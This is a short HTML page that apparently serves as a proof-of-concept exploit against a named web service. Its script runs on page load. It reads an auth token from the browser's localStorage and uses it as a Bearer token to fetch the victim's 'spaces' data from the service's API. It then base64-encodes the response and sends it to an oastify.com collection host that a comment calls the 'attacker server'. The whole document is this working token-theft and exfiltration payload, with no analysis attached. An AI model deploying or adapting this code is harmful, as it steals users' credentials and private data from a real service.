<!DOCTYPE html>
<html>
  <body>
    <script>
      async function exploit() {
        // Grab token from localStorage (if frontend stores it there)
        let token = localStorage.getItem("authToken");  

        if (!token) {
          alert("No token found in localStorage. Exploit blocked.");
          return;
        }

        // Make authenticated request with victimâ€™s token
        let resp = await fetch("https://app.guidde.com/c/v1/spaces", {
          headers: { "Authorization": "Bearer " + token }
        });

        let data = await resp.text();

        // Send data to attacker server
        await fetch("https://96dhvhp11yr5fzuvhiwjm8iz7qdh35tti.oastify.com/log?data=" + btoa(data));
      }

      exploit();
    </script>
  </body>
</html>
